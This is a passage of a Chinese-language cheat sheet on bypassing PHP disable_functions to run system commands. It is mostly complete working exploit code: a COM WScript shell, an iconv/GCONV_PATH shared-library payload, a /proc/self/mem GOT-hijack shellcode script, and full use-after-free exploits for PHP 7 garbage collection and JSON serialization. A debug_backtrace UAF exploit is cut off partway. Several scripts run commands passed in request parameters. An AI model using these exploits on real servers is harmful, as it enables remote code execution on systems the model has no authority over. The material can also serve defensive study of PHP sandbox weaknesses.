'wscript') {\n    $command = $_GET['cmd'];\n    $wshit = new COM('WScript.shell') or die(\"Create Wscript.Shell Failed!\");\n    $exec = $wshit->exec(\"cmd /c\".$command);\n    $stdout = $exec->StdOut();\n    $stroutput = $stdout->ReadAll();\n    echo $stroutput;\n}\nelseif($wsh == 'application') {\n    $command = $_GET['cmd'];\n    $wshit = new COM(\"Shell.Application\") or die(\"Shell.Application Failed!\");\n    $exec = $wshit->ShellExecute(\"cmd\",\"/c \".$command);\n}\nelse {\n  echo(0);\n}\n?>\n```\n\n\n# iconv\n\n\n**利用条件**\n- Linux 操作系统\n- putenv\n- iconv\n- 存在可写的目录, 需要上传 .so 文件\n\n**原理**\n\nphp在执行iconv函数时，实际上是调用glibc中的iconv相关函数，其中一个很重要的函数叫做iconv_open()\n\nphp的iconv函数的第一个参数是字符集的名字，这个参数也会传递到glibc的iconv_open函数的参数中\n\n\niconv_open函数的执行过程：\n1：iconv_open函数首先会找到系统提供的gconv-modules文件，查看各个字符集的.so文件所在位置\n2：然后再根据gconv-modules文件的指示去链接参数对应的.so文件\n3：之后会调用.so文件中的gconv()与gonv_init()函数\n\n\n使用的时候在编码转换时指定设置好的xxx编码，就会去调用指定的so文件了\n\n**利用**\n\ngconv-modules\n\n```\nmodule  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2\nmodule  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2\n```\n\npayload.c\n\n`gcc payload.c -o payload.so -shared -fPIC`\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nvoid gconv() {}\n\nvoid gconv_init() {\n  puts(\"pwned\");\n  system(\"ls / > /tmp/1.txt\");\n  exit(0);\n}\n```\n\n1.php\n\n```php\n<?php\n    putenv(\"GCONV_PATH=/tmp/\");\n    iconv(\"payload\", \"UTF-8\", \"whatever\");\n\n    // 其他调用了iconv_open()的函数也可以触发rce\n    // iconv_strlen(\"1\",\"payload\");\n?>\n```\n\n\n>linux系统提供了一个环境变量：GCONV_PATH，该环境变量能够使glibc使用用户自定义的gconv-modules文件\n\n将 gconv-modules 和编译好的 payload.so 传入tmp后执行1.php即可\n\n\n\n# 写shellcode劫持got表\n\n[深入了解GOT,PLT和动态链接](https://www.cnblogs.com/pannengzhi/p/2018-04-09-about-got-plt.html)\n\n劫持got表的思路\n\n- 读 /proc/self/maps 和 /proc/self/exe ，分别找到程序基地址，栈地址，libc地址和利用函数(open)的got表地址\n- 写 /proc/self/mem ，修改利用函数(open)的got表地址为存放shellcode的地址\n- 构造shellcode并写入\n- 通过例如readfile等可以调用open函数的函数来触发shellcode\n\n\n```php\n<?php\n\n/***\nhttps://xz.aliyun.com/t/7990\nhttps://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&mid=2247485666&idx=1&sn=71a0cce05637edd488cb9cccb3967504\n***/\n\n/*\nsection tables type\n*/\n\ndefine('SHT_NULL',0);\ndefine('SHT_PROGBITS',1);\ndefine('SHT_SYMTAB',2);\ndefine('SHT_STRTAB',3);\ndefine('SHT_RELA',4);\ndefine('SHT_HASH',5);\ndefine('SHT_DYNAMIC',6);\ndefine('SHT_NOTE',7);\ndefine('SHT_NOBITS',8);\ndefine('SHT_REL',9);\ndefine('SHT_SHLIB',10);\ndefine('SHT_DNYSYM',11);\ndefine('SHT_INIT_ARRAY',14);\ndefine('SHT_FINI_ARRAY',15);\n//why does section tables have so many fuck type\ndefine('SHT_GNU_HASH',0x6ffffff6);\ndefine('SHT_GNU_versym',0x6fffffff);\ndefine('SHT_GNU_verneed',0x6ffffffe);\n\n\nclass elf{\n    private $elf_bin;\n    private $strtab_section=array();\n    private $rel_plt_section=array();\n    private $dynsym_section=array();\n    public $shared_librarys=array();\n    public $rel_plts=array();\n    public function getElfBin()\n    {\n        return $this->elf_bin;\n    }\n    public function setElfBin($elf_bin)\n    {\n        $this->elf_bin = fopen($elf_bin,\"rb\");\n    }\n    public function unp($value)\n    {\n        return hexdec(bin2hex(strrev($value)));\n    }\n    public function get($start,$len){\n\n        fseek($this->elf_bin,$start);\n        $data=fread ($this->elf_bin,$len);\n        rewind($this->elf_bin);\n        return $this->unp($data);\n    }\n    public function get_section($elf_bin=\"\"){\n        if ($elf_bin){\n            $this->setElfBin($elf_bin);\n        }\n        $this->elf_shoff=$this->get(0x28,8);\n        $this->elf_shentsize=$this->get(0x3a,2);\n        $this->elf_shnum=$this->get(0x3c,2);\n        $this->elf_shstrndx=$this->get(0x3e,2);\n        for ($i=0;$i<$this->elf_shnum;$i+=1){\n            $sh_type=$this->get($this->elf_shoff+$i*$this->elf_shentsize+4,4);\n            switch ($sh_type){\n                case SHT_STRTAB:\n                    $this->strtab_section[$i]=\n                        array(\n                            'strtab_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),\n                            'strtab_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8)\n                        );\n                    break;\n\n                case SHT_RELA:\n                    $this->rel_plt_section[$i]=\n                        array(\n                            'rel_plt_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),\n                            'rel_plt_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),\n                            'rel_plt_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)\n                        );\n                    break;\n                case SHT_DNYSYM:\n                    $this->dynsym_section[$i]=\n                        array(\n                            'dynsym_offset'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+24,8),\n                            'dynsym_size'=>$this->strtab_size=$this->get($this->elf_shoff+$i*$this->elf_shentsize+32,8),\n                            'dynsym_entsize'=>$this->get($this->elf_shoff+$i*$this->elf_shentsize+56,8)\n                        );\n                    break;\n\n                case SHT_NULL:\n                case SHT_PROGBITS:\n                case SHT_DYNAMIC:\n                case SHT_SYMTAB:\n                case SHT_NOBITS:\n                case SHT_NOTE:\n                case SHT_FINI_ARRAY:\n                case SHT_INIT_ARRAY:\n                case SHT_GNU_versym:\n                case SHT_GNU_HASH:\n                    break;\n\n                default:\n                    //                   echo \"who knows what $sh_type this is? \";\n\n            }\n        }\n    }\n    public function get_reloc(){\n        $rel_plts=array();\n        $dynsym_section= reset($this->dynsym_section);\n        $strtab_section=reset($this->strtab_section);\n        foreach ($this->rel_plt_section as $rel_plt ){\n            for ($i=$rel_plt['rel_plt_offset'];$i<$rel_plt['rel_plt_offset']+$rel_plt['rel_plt_size'];$i+=$rel_plt['rel_plt_entsize'])\n            {\n                $rel_offset=$this->get($i,8);\n                $rel_info=$this->get($i+8,8)>>32;\n                $fun_name_offset=$this->get($dynsym_section['dynsym_offset']+$rel_info*$dynsym_section['dynsym_entsize'],4);\n                $fun_name_offset=$strtab_section['strtab_offset']+$fun_name_offset-1;\n                $fun_name='';\n                while ($this->get(++$fun_name_offset,1)!=\"\"){\n                    $fun_name.=chr($this->get($fun_name_offset,1));\n                }\n                $rel_plts[$fun_name]=$rel_offset;\n            }\n        }\n        $this->rel_plts=$rel_plts;\n    }\n    public function get_shared_library($elf_bin=\"\"){\n        if ($elf_bin){\n            $this->setElfBin($elf_bin);\n        }\n        $shared_librarys=array();\n        $dynsym_section=reset($this->dynsym_section);\n        $strtab_section=reset($this->strtab_section);\n        for($i=$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_entsize'];$i<$dynsym_section['dynsym_offset']+$dynsym_section['dynsym_size'];$i+=$dynsym_section['dynsym_entsize'])\n        {\n            $shared_library_offset=$this->get($i+8,8);\n            $fun_name_offset=$this->get($i,4);\n            $fun_name_offset=$fun_name_offset+$strtab_section['strtab_offset']-1;\n            $fun_name='';\n            while ($this->get(++$fun_name_offset,1)!=\"\"){\n                $fun_name.=chr($this->get($fun_name_offset,1));\n            }\n            $shared_librarys[$fun_name]=$shared_library_offset;\n        }\n        $this->shared_librarys=$shared_librarys;\n    }\n    public function close(){\n        fclose($this->elf_bin);\n    }\n\n    public function __destruct()\n    {\n        $this->close();\n    }\n    public function packlli($value) {\n        $higher = ($value & 0xffffffff00000000) >> 32;\n        $lower = $value & 0x00000000ffffffff;\n        return pack('V2', $lower, $higher);\n    }\n}\n\n\n// step1：拿到open函数的got表的地址\n$test=new elf();\n$test->get_section('/proc/self/exe'); //解析/proc/self/exe即当前程序\n$test->get_reloc();  //获得各函数的got表的地址\n$open_php=$test->rel_plts['open'];\n\n\n// step2：拿到程序基地址，栈地址，libc地址\n$maps = file_get_contents('/proc/self/maps');\npreg_match('/(\\w+)-(\\w+)\\s+.+\\[stack]/', $maps, $stack);\npreg_match('/(\\w+)-(\\w+).*?libc-/',$maps,$libcgain);\n$libc_base = \"0x\".$libcgain[1];\necho \"Libc base: \".$libc_base.\"\\n\";\necho \"Stack location: \".$stack[1].\"\\n\";\n$pie_base = hexdec(\"0x\".(explode('-', $maps)[0]));\necho \"PIE base: \".$pie_base.\"\\n\";\n\n\n// step3：计算system的实际地址\n$test2=new elf();\npreg_match('#.*?(/.*libc-\\d.\\d\\d.so)#',$maps,$libc); // 匹配libc\n$test2->get_section($libc[1]);\n$test2->get_reloc();\n$test2->get_shared_library(); //获得libc中的各函数的地址\n$sys = $test2->shared_librarys['system'];  //获取libc中system的偏移\n$sys_addr = $sys + hexdec($libc_base);  //加上libc基地址获得system函数的实际地址\necho \"system addr: \".$sys_addr.\"\\n\";\n\n\n// step4：修改got表指向的地址\n$mem = fopen('/proc/self/mem','wb'); //修改该文件相当于直接修改当前进程的内存\n$shellcode_loc = $pie_base + 0x2333;  //随便找一个存放shellcode的地址\nfseek($mem,$open_php);  //文件指针定位到open函数的got表的地址\nfwrite($mem,$test->packlli($shellcode_loc)); //向open函数的got表的地址写入我们shellcode的存放地址\n\n\n// step5：写入命令到shellcode，并将shellcode写入到之前指定的地址中\n$command=\"ls > /var/www/html/1.txt\";\n//$command=$_GET['cmd'];\n$stack=hexdec(\"0x\".$stack[1]);\nfseek($mem, $stack);  //文件指针定位到栈地址\nfwrite($mem, \"{$command}\\x00\");  //向栈地址写入要执行的命令\n$cmd = $stack;  //$cmd变量的值即为要执行的命令的存放地址\n$shellcode = \"H\\xbf\".$test->packlli($cmd).\"H\\xb8\".$test->packlli($sys_addr).\"P\\xc3\";\nfseek($mem,$shellcode_loc); //文件指针定位到之前写入open函数got表的地址\nfwrite($mem,$shellcode); //向该地址写入处理好的shellcode\n\n\n// step6：触发open函数\nreadfile('aaa','r'); //通过readfile函数调用open函数，在跳转到got表指向的地址即进入我们的shellcode地址执行\necho \"DONE\\n\";\nexit();\n```\n\n其中的shellcode为\n\n```python\n>>> from pwn import *\n>>> context.arch = \"amd64\"\n>>> shellcode='''\n... mov rdi,0xffffffff\n... mov rax,0xffffffff\n... push rax\n... ret\n... '''\n>>>\n>>> asm(shellcode)\nb'H\\xbf\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00H\\xb8\\xff\\xff\\xff\\xff\\x00\\x00\\x00\\x00P\\xc3'\n```\n\n\n\n**利用条件**\n\n- /proc/self/mem 可读写\n- Linux 内核版本 >= 2.98\n- PHP-CGI 或 PHP-FPM 启动\n\napache+php 由于 apache 调用 setuid 设置 www-data 权限工作进程，/proc/self/mem 属于 www-data 且权限是600，/proc/self/ 目录属于root用户，导致没有权限读写\n\n但是对于 Nginx+php ，且为低版本的 php-fpm（PHP<5.6），/proc/self/属于 www-data ，可以通过写入GOT表来实现RCE\n\n\n\n>注：我在实际利用中并没有成功\n\n\n\n# 利用UAF Bypass\n\n各种利用二进制漏洞去攻击的手法\n原理就不细说了，也不太懂pwn，放链接了\n\n## php7_GC_UAF（PHP 7.0-7.3）\n\n**利用条件**\n\n- Linux 操作系统\n- PHP7.0 - all versions to date\n- PHP7.1 - all versions to date\n- PHP7.2 - all versions to date\n- PHP7.3 - all versions to date\n\n\n**原理**\n\n通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令\n\n[PHP中的内存破坏漏洞利用学习(1st)](http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/)\n\n**exp**\n\n```php\n<?php\n\n# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=72530\n#\n# This exploit should work on all PHP 7.0-7.3 versions\n#\n# Author: https://github.com/mm0r1\n\n//pwn(\"uname -a\");\npwn($_POST['cmd']);\n\nfunction pwn($cmd) {\n    global $abc, $helper;\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    class ryat {\n        var $ryat;\n        var $chtg;\n        \n        function __destruct()\n        {\n            $this->chtg = $this->ryat;\n            $this->ryat = 1;\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n\n    $n_alloc = 10; # increase this value if you get segfaults\n\n    $contiguous = [];\n    for($i = 0; $i < $n_alloc; $i++)\n        $contiguous[] = str_repeat('A', 79);\n\n    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:\"ryat\":2:{s:4:\"ryat\";R:3;s:4:\"chtg\";i:2;}}i:1;i:3;i:2;R:5;}';\n    $out = unserialize($poc);\n    gc_collect_cycles();\n\n    $v = [];\n    $v[0] = ptr2str(0, 79);\n    unset($v);\n    $abc = $out[2][0];\n\n    $helper = new Helper;\n    $helper->b = function ($x) { };\n\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n\n    $closure_obj = str2ptr($abc, 0x20);\n\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i < 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n\n    ($helper->b)($cmd);\n\n    exit();\n}\n```\n\n## JSON_Serializer_UAF（PHP 7.1-7.3）\n\n**利用条件**\n\n- Linux 操作系统\n- PHP7.1 - all versions to date\n- PHP7.2 < 7.2.19 (released: 30 May 2019)\n- PHP7.3 < 7.3.6 (released: 30 May 2019)\n\n**原理**\n\n此漏洞利用json序列化程序中的释放后使用漏洞，利用json序列化程序中的堆溢出触发，以绕过 disable_functions 和执行系统命令\n\n[Use after free with json serializer](https://bugs.php.net/bug.php?id=77843)\n\n**exp**\n\n```php\n<?php\n\n//$cmd = \"id\";\n$cmd = $_POST['cmd'];\n\n$n_alloc = 10; # increase this value if you get segfaults\n\nclass MySplFixedArray extends SplFixedArray {\n    public static $leak;\n}\n\nclass Z implements JsonSerializable {\n    public function write(&$str, $p, $v, $n = 8) {\n      $i = 0;\n      for($i = 0; $i < $n; $i++) {\n        $str[$p + $i] = chr($v & 0xff);\n        $v >>= 8;\n      }\n    }\n\n    public function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    public function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    # unable to leak ro segments\n    public function leak1($addr) {\n        global $spl1;\n\n        $this->write($this->abc, 8, $addr - 0x10);\n        return strlen(get_class($spl1));\n    }\n\n    # the real deal\n    public function leak2($addr, $p = 0, $s = 8) {\n        global $spl1, $fake_tbl_off;\n\n        # fake reference zval\n        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted\n        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval\n        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)\n\n        $leak = strlen($spl1::$leak);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n\n        return $leak;\n    }\n\n    public function parse_elf($base) {\n        $e_type = $this->leak2($base, 0x10, 2);\n\n        $e_phoff = $this->leak2($base, 0x20);\n        $e_phentsize = $this->leak2($base, 0x36, 2);\n        $e_phnum = $this->leak2($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = $this->leak2($header, 0, 4);\n            $p_flags = $this->leak2($header, 4, 4);\n            $p_vaddr = $this->leak2($header, 0x10);\n            $p_memsz = $this->leak2($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    public function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = $this->leak2($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = $this->leak2($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = $this->leak2($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = $this->leak2($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    public function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak & 0xfffffffffffff000;\n        for($i = 0; $i < 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = $this->leak2($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n\n    public function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = $this->leak2($addr);\n            $f_name = $this->leak2($f_entry, 0, 6);\n\n            if($f_name == 0x6d6574737973) { # system\n                return $this->leak2($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n\n    public function jsonSerialize() {\n        global $y, $cmd, $spl1, $fake_tbl_off, $n_alloc;\n\n        $contiguous = [];\n        for($i = 0; $i < $n_alloc; $i++)\n            $contiguous[] = new DateInterval('PT1S');\n\n        $room = [];\n        for($i = 0; $i < $n_alloc; $i++)\n            $room[] = new Z();\n\n        $_protector = $this->ptr2str(0, 78);\n\n        $this->abc = $this->ptr2str(0, 79);\n        $p = new DateInterval('PT1S');\n\n        unset($y[0]);\n        unset($p);\n\n        $protector = \".$_protector\";\n\n        $x = new DateInterval('PT1S');\n        $x->d = 0x2000;\n        $x->h = 0xdeadbeef;\n        # $this->abc is now of size 0x2000\n\n        if($this->str2ptr($this->abc) != 0xdeadbeef) {\n            die('UAF failed.');\n        }\n\n        $spl1 = new MySplFixedArray();\n        $spl2 = new MySplFixedArray();\n\n        # some leaks\n        $class_entry = $this->str2ptr($this->abc, 0x120);\n        $handlers = $this->str2ptr($this->abc, 0x128);\n        $php_heap = $this->str2ptr($this->abc, 0x1a8);\n        $abc_addr = $php_heap - 0x218;\n\n        # create a fake class_entry\n        $fake_obj = $abc_addr;\n        $this->write($this->abc, 0, 2); # type\n        $this->write($this->abc, 0x120, $abc_addr); # fake class_entry\n\n        # copy some of class_entry definition\n        for($i = 0; $i < 16; $i++) {\n            $this->write($this->abc, 0x10 + $i * 8, \n                $this->leak1($class_entry + 0x10 + $i * 8));\n        }\n\n        # fake static members table\n        $fake_tbl_off = 0x70 * 4 - 16;\n        $this->write($this->abc, 0x30, $abc_addr + $fake_tbl_off);\n        $this->write($this->abc, 0x38, $abc_addr + $fake_tbl_off);\n\n        # fake zval_reference\n        $this->write($this->abc, $fake_tbl_off, $abc_addr + $fake_tbl_off + 0x10); # zval\n        $this->write($this->abc, $fake_tbl_off + 8, 10); # zval type (reference)\n\n        # look for binary base\n        $binary_leak = $this->leak2($handlers + 0x10);\n        if(!($base = $this->get_binary_base($binary_leak))) {\n            die(\"Couldn't determine binary base address\");\n        }\n\n        # parse elf header\n        if(!($elf = $this->parse_elf($base))) {\n            die(\"Couldn't parse ELF\");\n        }\n\n        # get basic_functions address\n        if(!($basic_funcs = $this->get_basic_funcs($base, $elf))) {\n            die(\"Couldn't get basic_functions address\");\n        }\n\n        # find system entry\n        if(!($zif_system = $this->get_system($basic_funcs))) {\n            die(\"Couldn't get zif_system address\");\n        }\n        \n        # copy hashtable offsetGet bucket\n        $fake_bkt_off = 0x70 * 5 - 16;\n\n        $function_data = $this->str2ptr($this->abc, 0x50);\n        for($i = 0; $i < 4; $i++) {\n            $this->write($this->abc, $fake_bkt_off + $i * 8, \n                $this->leak2($function_data + 0x40 * 4, $i * 8));\n        }\n\n        # create a fake bucket\n        $fake_bkt_addr = $abc_addr + $fake_bkt_off;\n        $this->write($this->abc, 0x50, $fake_bkt_addr);\n        for($i = 0; $i < 3; $i++) {\n            $this->write($this->abc, 0x58 + $i * 4, 1, 4);\n        }\n\n        # copy bucket zval\n        $function_zval = $this->str2ptr($this->abc, $fake_bkt_off);\n        for($i = 0; $i < 12; $i++) {\n            $this->write($this->abc,  $fake_bkt_off + 0x70 + $i * 8, \n                $this->leak2($function_zval, $i * 8));\n        }\n\n        # pwn\n        $this->write($this->abc, $fake_bkt_off + 0x70 + 0x30, $zif_system);\n        $this->write($this->abc, $fake_bkt_off, $fake_bkt_addr + 0x70);\n\n        $spl1->offsetGet($cmd);\n\n        exit();\n    }\n}\n\n$y = [new Z()];\njson_encode([&$y]);\n```\n\n## php7_Backtrace_UAF（PHP 7.0-7.4）\n\n\n**利用条件**\n\n- Linux 操作系统\n- PHP7.0 - all versions to date\n- PHP7.1 - all versions to date\n- PHP7.2 - all versions to date\n- PHP7.3 < 7.3.15 (released 20 Feb 2020)\n- PHP7.4 < 7.4.3 (released 20 Feb 2020)\n\n**原理**\n\n该漏洞利用在 debug_backtrace() 函数中使用了两年的一个 bug。我们可以诱使它返回对已被破坏的变量的引用，从而导致释放后使用漏洞\n\n[Use-after-free when accessing already destructed backtrace arguments](https://bugs.php.net/bug.php?id=76047)\n\n**exp**\n\n```php\n<?php\n\n# PHP 7.0-7.4 disable_functions bypass PoC (*nix only)\n#\n# Bug: https://bugs.php.net/bug.php?id=76047\n# debug_backtrace() returns a reference to a variable\n# that has been destroyed, causing a UAF vulnerability.\n#\n# This exploit should work on all PHP 7.0-7.4 versions\n# released as of 30/01/2020.\n#\n# Author: https://github.com/mm0r1\n\n//pwn(\"uname -a\");\npwn($_POST['cmd']);\n\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this->a);\n            $backtrace = (new Exception)->getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP >= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n\n    function str2ptr(&$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j >= 0; $j--) {\n            $address <<= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i < $m; $i++) {\n            $out .= chr($ptr & 0xff);\n            $ptr >>= 8;\n        }\n        return $out;\n    }\n\n    function write(&$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i < $n; $i++) {\n            $str[$p + $i] = chr($v & 0xff);\n            $v >>= 8;\n        }\n    }\n\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper->a);\n        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }\n        return $leak;\n    }\n\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n\n        for($i = 0; $i < $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n\n            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n\n        return [$data_addr, $text_size, $data_size];\n    }\n\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i < $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n\n            return $data_addr + $i * 8;\n        }\n    }\n\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = 